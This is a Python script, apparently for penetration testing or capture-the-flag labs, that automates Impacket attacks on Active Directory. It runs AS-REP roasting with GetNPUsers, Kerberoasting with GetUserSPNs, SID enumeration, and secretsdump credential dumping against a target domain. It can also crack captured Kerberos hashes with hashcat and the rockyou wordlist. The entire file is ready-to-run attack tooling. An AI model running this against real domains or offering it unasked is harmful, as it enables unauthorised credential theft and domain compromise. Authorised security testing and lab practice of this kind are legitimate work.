#!/usr/bin/env python3 

#Script used to run impacket tools for easier exploitation

import os
import argparse
import sys
import time
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Impacket everything", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST, -r 10.10.10.1 ; ex: 10.10.10.0/24")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-H", "--HASH", action="store", help="NT hashes")
parser.add_argument("-U", "--UsersFile", action="store", help="Users file for GetNpUsers")
parser.add_argument("-E", "--AutoCrack", action="store_true", help="If hash is found try to autocrack it with hashcat")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
HASH = args.HASH
FILE = args.UsersFile
AUTO = args.AutoCrack

print(f"{YELLOW}Put {DOMAIN} into /etc/hosts or script will not run properly")
time.sleep(5)

def RUF():
    print(f"{YELLOW}Grabbing {FILE}{RESET}")
    os.system(f"GetNPUsers.py {DOMAIN}/ -no-pass -usersfile {FILE} -format hashcat > impacket_everything.txt")
def RUP():
    impack = f"{DOMAIN}/{USERNAME}:{PASSWORD}"
    print(f"{YELLOW}Trying some things against {RHOST}{RESET}")
    print(f"{YELLOW}Attempting GetNPUsers against {RHOST}{RESET}")
    os.system(f"GetNPUsers.py {impack} -request -format hashcat > impacket_everything.txt")
    with open ("impacket_everything.txt", "r") as f:
        content = f.read()
        print(content)
        word = "$krb5asrep$23$"
        if AUTO is not False:
            if word in content:
                print(f"Kerberoastable hash found with $krb5asrep$23$, attempting to crack with hashcat")
                os.system("hashcat -m 18200 impacket_everything.txt /usr/share/wordlists/rockyou.txt")
    print(f"{YELLOW}Attempting GetUsersSPNs {RHOST}{RESET}")
    os.system(f"GetUserSPNs.py {impack}")
    os.system(f"GetUserSPNs.py {impack} -request")
    print(f"{YELLOW}Attempting lookupsid {RHOST}{RESET}")
    os.system(f"lookupsid.py {impack}")
    print(f"{YELLOW}Attempting SecretsDump {RHOST}{RESET}")
    os.system(f"secretsdump.py {impack}")

if FILE != None:
    RUF()
if RHOST != None:
    RUP()
